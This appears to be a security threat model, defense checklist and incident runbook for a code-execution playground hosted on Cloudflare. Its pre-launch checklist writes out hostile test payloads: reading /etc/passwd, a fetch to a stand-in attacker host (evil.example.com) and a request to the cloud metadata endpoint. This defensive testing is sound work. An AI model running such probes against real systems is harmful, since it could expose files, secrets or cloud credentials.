---
title: "Playground Runner — Threat Model + Defense Checklist"
status: scaffolding
created: 2026-04-19
phase: 16.2
related:
  - packages/playground-runner/src/security.ts
  - docs/playground/deployment.md
  - docs/bun/phase-16-diagnostics/playground-runtime.md
---

# Playground Runner — Threat Model + Defense Checklist

This document enumerates every threat vector we've identified for the
Mandu playground runner and the specific code + infrastructure
defense(s) that address each one. It doubles as the incident-response
runbook when something does go wrong.

**Rule of thumb**: every defense is two-layered — a Cloudflare-provided
primitive **and** a Mandu-layer check. Never trust a single boundary.

## 1. Threats we defend against

| # | Threat | Impact | CF Primitive | Mandu Defense | Tested? |
|---|---|---|---|---|---|
| T1 | Host fs read (`/etc/passwd`) | Info leak | Container isolation | `/work` lock, `..` denial | TBD live |
| T2 | HTTP exfiltration | Data theft | Outbound Worker | `isAllowedEgress` | Unit |
| T3 | CPU DoS (`while(true){}`) | Cost + DoS | Active-CPU billing | 30s wall-clock abort | Integration |
| T4 | Memory bomb (huge alloc) | OOM | 256 MiB cap | Hard failure → error event | TBD live |
| T5 | Metadata IMDS pivot | SSRF-lite | CF no IMDS | egress deny-by-default | Unit |
| T6 | Abuse flood (bot farm) | Cost | CF Bot Mgmt | Turnstile + 5/15min gate | Manual |
| T7 | Crypto mining | Cost | CPU cap | Idle kill + coin denylist | TBD |
| T8 | Output spam (log-bomb) | Client DoS | - | 64 KiB cap + ANSI strip | Integration |
| T9 | Sandbox escape | Critical | Container isolation + seccomp | (rely on CF) | N/A |
| T10 | Code-injection via URL | XSS | - | `lz-string` hash fragment | N/A (front-end) |
| T11 | CORS/XSRF on /run | Unwanted exec | - | Content-Type gate + Turnstile | Manual |
| T12 | DO state leak run → run | Info leak | One DO per runId | `409 run-already-active` guard | Unit |

## 2. Defense layers

### 2.1 Network boundary

- **Outbound proxy**: every non-allowlisted fetch from a sandbox is
  blocked by the Worker's outbound proxy. Allowlist is frozen in
  `SECURITY_POLICY.egressAllowlist` — `localhost`, `127.0.0.1`,
  `sandbox-self`. No public hosts are on it by default.
- **Inbound**: the Worker accepts only `POST /api/playground/run`
  (application/json) + `GET /api/playground/health`. Everything else
  returns 404.
- **`sbx-*` proxy routes**: served only through `proxyToSandbox`. The
  Mandu-layer `isAllowedEgress` double-checks the hostname prefix to
  guard against misconfigured routes.

### 2.2 Execution boundary

- **Container isolation** (CF Sandboxes): each run spawns a fresh
  container; the DO id is minted per run so state can't leak.
- **Wall clock**: `AbortSignal` in the adapter + DO `alarm(30s+1s)`
  watchdog. Belt-and-suspenders.
- **CPU**: `SECURITY_POLICY.cpuBudgetMs = 15s` enforced by container
  instance class. Active-CPU billing makes runaway loops observable in
  the CF dashboard.
- **Memory**: 256 MiB cap on the `dev` instance class.
- **Output**: 64 KiB cap on stdout + stderr combined. ANSI escape
  sequences stripped via `stripAnsi`. Truncation emits an
  `{reason:"output-cap"}` event.

### 2.3 Abuse rate-limiting

- **Per-IP counter** (KV): 1-minute buckets. Reads lag ~60s globally
  (KV eventual consistency) — acceptable because combined with Turnstile.
- **Turnstile gate**: after 5 runs in 15 min, the Worker demands a
  fresh Turnstile token. Frontend shows an interactive challenge.
- **Hard cap**: 20 runs/hour/IP. Exceeding returns 429 with
  `Retry-After`.
- **Bot management**: CF's built-in features should be enabled at the
  zone level (dashboard toggle). Not code-layer.

### 2.4 Input validation

- Body is JSON; parse failure → 400 with `{reason:"compile"}` SSE event.
- `code` length ≤ 50 KiB (Worker layer) + ≤ 10 KiB (editor UI).
- `example` slug is unvalidated at the Worker — the sandbox test runner
  uses it as an env var only; it never becomes a path component.

## 3. Defense verification checklist (pre-launch)

Before exposing the runner to public traffic, manually verify each item:

- [ ] **T1**: `cat /etc/passwd` payload returns empty output + exit code 0
      (or a compile error) — NOT the actual file contents.
- [ ] **T2**: `fetch("https://evil.example.com")` payload triggers
      `{reason:"egress-denied"}` event.
- [ ] **T3**: `while(true){}` payload triggers `{reason:"timeout"}` within
      31s wall clock.
- [ ] **T4**: `new ArrayBuffer(512*1024*1024)` payload triggers OOM error
      (`{reason:"oom"}`) — NOT a crash of the Worker.
- [ ] **T5**: `fetch("http://169.254.169.254/...")` blocked.
- [ ] **T6**: 6 consecutive runs from a single IP → 6th returns 401 with
      `{error:"turnstile-required"}`. 21st run in an hour → 429.
- [ ] **T8**: 1 MB `console.log` output capped at 64 KiB + `output-cap`
      error. Front-end renders ANSI escapes as literals.
- [ ] **T11**: `POST` without `Content-Type: application/json` OR from a
      browser with no Turnstile challenge past the threshold → challenged.
      `OPTIONS` preflight returns a restricted Access-Control-Allow-Origin
      (not `*`).
- [ ] **T12**: Issue two runs with the same client-forged `runId` — second
      returns 409.

Automate the ones marked "Integration" above via `tests/mock-flow.test.ts`.
Mark "TBD live" items done in a live post-deploy smoke run — they require
a real container.

## 4. Metrics to watch

Wire these into Cloudflare Analytics + your on-call dashboard:

- **runs/minute** — baseline; spikes correlate with link-shares or abuse.
- **429 rate** — per-hour cap hits. Expected near zero.
- **Turnstile challenge rate** — > 5% sustained is suspicious.
- **timeout-error %** — > 20% means examples are drifting too complex OR
  an abuser is probing.
- **egress-denied events** — any non-zero value deserves an investigation.
- **Worker CPU-time p99** — spending cap early warning.
- **KV read latency** — if > 200ms p99, the rate-limit gate is flaky.

Export via Logpush to R2 for 90-day retention. Audit log schema:
`{ runId, clientIp, example, exitCode, durationMs, outBytes, errBytes,
egressDenied: boolean }`. **NEVER** log user `code`.

## 5. Incident response runbook

### 5.1 Abuse flood (rate spike, high Turnstile failures)

1. `wrangler tail` — grep for `rate-limit` + `turnstile-rejected`.
2. Pull top-N offending IPs from recent Logpush dump.
3. Manual ban (KV):

   ```bash
   wrangler kv key put --binding=RATE_LIMIT "rl:<ip>:block" "1" --ttl 86400
   ```

   (The gate does not currently honor a `block` suffix — add this check to
   `checkRateLimit()` before the first live deploy if this vector proves hot.)

4. If the flood persists > 30min, **pause the Worker**:
   `wrangler deployments delete <current-id>`. The front-end degrades
   gracefully.
5. Post-incident: file an issue in `#201` with log samples + root cause.

### 5.2 Runaway cost (spend > $10/week)

1. Check CF billing dashboard → Usage alerts.
2. If sustained abuse: pause the Worker (see 5.1 step 4).
3. If legit traffic growth: raise the spend cap after confirming the R0
   cost model still holds. Consider auto-scaling the `max_instances` in
   `wrangler.toml`.
4. If container leak (DO not releasing sandboxes): `wrangler sandbox list`
   to identify orphaned instances; manually kill.

### 5.3 Egress-denied spike

1. Usually benign: someone's example fetches `https://api.github.com`.
2. Rare: intentional probe. Confirm via Logpush — look for varied hosts
   per single IP.
3. Do NOT add hosts to the allowlist without a security review.

### 5.4 Sandbox escape (suspected)

1. **STOP** the Worker immediately: `wrangler deployments delete <id>`.
2. Snapshot DO storage for forensics.
3. Escalate to Cloudflare — sandbox escape is THEIR boundary.
4. File a `SEVERITY=CRITICAL` incident with details.

## 6. Change control

Any change to `SECURITY_POLICY` constants requires:

1. PR review with a security-labeled reviewer.
2. Update to this document's §2 table (new limits).
3. A deploy with the new limits in a staging Worker first (dedicated CF
   account). Run the full §3 checklist against staging before promoting.
4. Bump `@mandujs/playground-runner` version (even if private).

The policy is a product surface — users + operators depend on the
documented limits. Don't silently narrow or widen them.

## 7. References

- CF Sandbox threat model: https://developers.cloudflare.com/sandbox/security
- CF Turnstile: https://developers.cloudflare.com/turnstile/
- Phase 16 R0 security section:
  `docs/bun/phase-16-diagnostics/playground-runtime.md §3`
- OWASP sandbox-escape patterns (reference only, no CF-specific guidance)
